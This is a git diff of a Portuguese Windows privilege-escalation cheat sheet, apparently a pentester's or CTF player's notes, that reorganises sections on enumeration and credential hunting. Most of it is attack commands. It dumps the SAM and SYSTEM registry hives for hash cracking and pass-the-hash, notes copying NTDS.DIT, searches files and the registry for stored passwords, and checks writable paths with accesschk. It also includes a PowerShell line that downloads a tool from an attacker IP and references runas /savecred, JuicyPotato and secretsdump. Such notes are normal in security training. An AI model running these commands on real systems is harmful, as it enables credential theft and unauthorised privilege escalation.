@@ -14,9 +14,9 @@
 - [ ] [**Enumeração de processos da máquina**](#enumeracao-de-processos)
 - [ ] [**AlwaysInstallElevated**](#alwaysinstallelevated)
 - [ ] [**Credenciais em cache**](#credenciais-em-cache)
-9. Ja peguei cenarios em que uma maquina virtual estava instalada na maquina e foi possivel obter credenciais no historico desta mesma maquina
-11. Enumerar os discos da máquina e procurar por senhas ou arquivos sensíveis dentro destes.
-21. Weak service permissions
+- [ ] [**Enumerar dispositivos da máquina**](#enumerar-dispositivos-da-maquina)
+- [ ] [**Enumerar senhas por meio de arquivos de configuração, anotações de usuários, etc...**](#enumeracao-de-senhas)
+- [ ] [**Permissionamento de arquivos**](#permissionamento-de-arquivos-e-pastas)
 
 Depois considerar esse link para verifcar uma ferramenta para obtenção de credencais em processos como firefox chrome e afins...
 
@@ -76,10 +76,13 @@ Esse juicyPotato que funcionou é o que se encontra neste link:
 **SeBackup**
 
 Aqui podemos fazer uma cópia dos arquivos system e sam para a máquina do atacante para quebrar os hashes de senha ou utilizá-los para fazer os ataques pass the hash:
+
 ```
 reg save hklm\sam c:\Temp\sam
 reg save hklm\system c:\Temp\system
 ```
+
+**Observação de que no cenário de Domain Controller, temos de considerar a cópia do NTDS.DIT seguindo as seguintes etapas:**
 
 Fazer um arquivo com o seguinte conteúdo:
 ```
@@ -112,6 +115,8 @@ Já na máquina do atacante, podemos executar o seguinte:
 
  Navegar nos diretorios do usuario para ver se existe algo ali que possa nos fornecer uma credencial ou algum bionario que inicie um servico/programa vulneravel a escalacao de privilegio
 
+**Verificar se dentro do C:/ também existe algo.**
+
 cmd
 
 ```
@@ -122,6 +127,11 @@ Mais abrangente:
 cd c:\users
 dir /s
 ```
+```
+cd c:/
+dir
+```
+
 Powershell
 ```
 gci 'c:\program files','c:\program files (x86)' | ft name, path, lastwritetime
@@ -408,19 +418,62 @@ runas /savecred /user:Administrator "cmd.exe /k whoami"
 ```
 </details>
 
-## ATENTIONPOINTS
+<details markdown="1"><summary markdown="1">
+## Enumerar dispositivos da máquina
+</summary>
 
-Aqui um ponto de atenção é que, caso não encontre nada na máquina, vale considerar que o serviço pelo qual entramos (geralmente web app), pode fornecer um ponto de entrada para a escalação de priilégio por meio da aplicação que está rodando no contexto system. às vezes a verificação ocorre por tentiva e erro mesmo.
+```
+driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object Display Name, Start Mode, Path
 
-Detalhe que daqui em diante, as enumerações são todas vistas nos processos automatizados. Então é bom não deixar de verificar este último ponto e um double check manual mesmo.
+Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer
 
+Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
+```
+```
+wmic logicaldisk get deviceid, volumename, description
 
+#powershelll
+powershell -c get-psdrive -psprovider filesystem
 
+mountvol
+```
+Depois de enumerar, eh interessante montarmos o volume pra verificar se temos algo.
 
+mountvol G: \\?\Volume{ff136f5c-4935-11e9-80b5-806e6f6e6963}\
 
+    mountvol
 
-## Find all weak file permissions per drive.
+Depois dee enumerar, eh interessante montarmos o volume pra verificar se temos algo.
 
+    mountvol G: \\?\Volume{ff136f5c-4935-11e9-80b5-806e6f6e6963}\
+</details>
+
+<details markdown="1"><summary markdown="1">
+## Enumeração de senhas
+</summary>
+    findstr /si password *.doc *.txt *.ini *.config
+    
+    gci -recurse -filter passwd*
+    
+    dir /s *pass* == *cred* == *ssh* == *.config*
+    
+    reg query HKLM /f *password* /t REG_SZ /s
+    
+    reg query HKLM /f teamviewer /t REG_SZ /s
+    
+    reg query HKCU /f password /t REG_SZ /s
+    
+    
+    Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+    
+    driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
+    
+    Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
+</details>
+
+<details markdown="1"><summary markdown="1">
+## Permissionamento de arquivos e pastas
+</summary>
 ```
 (new-object net.webclient).downloadfile('http://10.10.14.17/4-privilege%20escalation/accesschk64.exe', 'c:\temp\a.exe')
 
@@ -437,6 +490,18 @@ accesschk.exe -uwqs Users c:\*.*
 accesschk.exe -uws "Everyone" "C:\Program Files"
 accesschk.exe -uwqs "Authenticated Users" c:\*.*
 ```
+</details>
+
+## Pontos de atenção
+
+Aqui um ponto de atenção é que, caso não encontre nada na máquina, vale considerar que o serviço pelo qual entramos (geralmente web app), pode fornecer um ponto de entrada para a escalação de priilégio por meio da aplicação que está rodando no contexto system. às vezes a verificação ocorre por tentiva e erro mesmo.
+
+Detalhe que daqui em diante, as enumerações são todas vistas nos processos automatizados. Então é bom não deixar de verificar este último ponto e um double check manual mesmo.
+
+
+
+
+
 
 ## Binary planting
 
@@ -476,36 +541,7 @@ impacket-secretsdump -sam SAM -system SYSTEM local
 
 ou até mesmo fazendo o port forwarding
 
-
-## Enumerate device drivers
-
-```
-driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object Display Name, Start Mode, Path
-
-Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer
-
-Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
-```
-```
-wmic logicaldisk get deviceid, volumename, description
-
-#powershelll
-powershell -c get-psdrive -psprovider filesystem
-
-mountvol
-```
-Depois de enumerar, eh interessante montarmos o volume pra verificar se temos algo.
-
-mountvol G: \\?\Volume{ff136f5c-4935-11e9-80b5-806e6f6e6963}\
-
-    mountvol
-
-Depois dee enumerar, eh interessante montarmos o volume pra verificar se temos algo.
-
-    mountvol G: \\?\Volume{ff136f5c-4935-11e9-80b5-806e6f6e6963}\
-
-
-## firwewall rules enumeration
+## Enumeração de regras de firewall
 
     netsh advfirewall show currentprofile
     
@@ -514,27 +550,6 @@ Depois dee enumerar, eh interessante montarmos o volume pra verificar se temos a
      Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 
 
-## PasswordEnumeration
-
-    findstr /si password *.doc *.txt *.ini *.config
-    
-    gci -recurse -filter passwd*
-    
-    dir /s *pass* == *cred* == *ssh* == *.config*
-    
-    reg query HKLM /f *password* /t REG_SZ /s
-    
-    reg query HKLM /f teamviewer /t REG_SZ /s
-    
-    reg query HKCU /f password /t REG_SZ /s
-    
-    
-    Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
-    
-    driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
-    
-    Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
- 
 ## Writable files
  
      Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
